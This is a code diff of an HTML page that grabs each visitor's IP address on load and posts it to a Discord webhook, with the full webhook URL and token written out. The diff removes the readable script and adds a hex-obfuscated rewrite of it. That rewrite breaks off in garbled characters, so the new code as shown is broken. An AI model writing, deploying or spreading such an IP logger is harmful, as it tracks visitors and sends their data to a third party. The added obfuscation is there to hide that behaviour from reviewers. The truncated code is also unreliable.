@@ -3,54 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TOMMY PARKY BIG STRONG</title>
+    <title>V8KBTU TPOYY STRGBIG</title>
 </head>
 <body>
     <h1>Fetching and Sending Your IP Address to UTUBETROLLPOLICE</h1>
     <p id="status">Loading...</p>
 
     <script>
-        // Define the Discord Webhook URL
-        const discordWebhookUrl = 'https://ptb.discord.com/api/webhooks/1376131891102748682/V5XxcrZyBUX9_ybZQf92kt8k6IceJJt87k-i6EUatSMLE8Krq1Oqz218_o6URnKbBzeZ';  // Replace with your Discord webhook URL
-
-        // Fetch the user's IP address from ipify
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())  // Parse JSON response
-            .then(data => {
-                // Get the user's IP address
-                const userIp = data.ip;
-
-                // Display IP on the webpage
-                document.getElementById('status').textContent = `Your IP Address: ${userIp}`;
-
-                // Create the message payload for Discord
-                const payload = {
-                    content: `New user IP: ${userIp}`  // The message you want to send to Discord
-                };
-
-                // Send the IP to the Discord webhook
-                fetch(discordWebhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(payload)  // Send the payload as JSON
-                })
-                .then(response => {
-                    if (response.ok) {
-                        console.log('IP address sent to Discord successfully');
-                    } else {
-                        console.error('Failed to send IP to Discord');
-                    }
-                })
-                .catch(error => {
-                    console.error('Error sending IP to Discord:', error);
-                });
-            })
-            .catch(error => {
-                console.error('Error fetching IP address:', error);
-                document.getElementById('status').textContent = 'Unable to fetch IP address';
-            });
-    </script>
-</body>
-</html>
+        (function(){const _0x52b7=["\x66\x65\x74\x63\x68","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x66\x79\x2E\x6F\x72\x67\x3F\x66\x6F\x72\x6D\x61\x74\x3D\x6A\x73\x6F\x6E","\x2F\x2F\x70\x74\x62\x2E\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x33\x37\x36\x31\x33\x31\x38\x39\x31\x31\x30\x32\x37\x34\x38\x36\x38\x32\x2F\x56\x35\x58\x78\x63\x72\x5A\x79\x42\x55\x58\x39\x5F\x79\x62\x5A\x51\x66\x39\x32\x6B\x74\x38\x6B\x36\x49\x63\x65\x4A\x4A\x74\x38\x37\x6B\x2D\x69\x36\x45\x55\x61\x74\x53\x4D\x4C\x45\x38\x4B\x72\x71\x31\x4F\x71\x7A\x32\x31\x38\x5F\x6F\x36\x55\x52\x6E\x4B\x62\x42\x7A\x65\x5A\x7A\x7A","\x2F\x2F\x61\x70\x69\x66\x79\x2E\x6F\x72\x67\x3F\x66\x6F\x72\x6D\x61\x74\x3D\x6A\x73\x6F\x6E","\x64\x6F\x63\x75\x6D\]()_
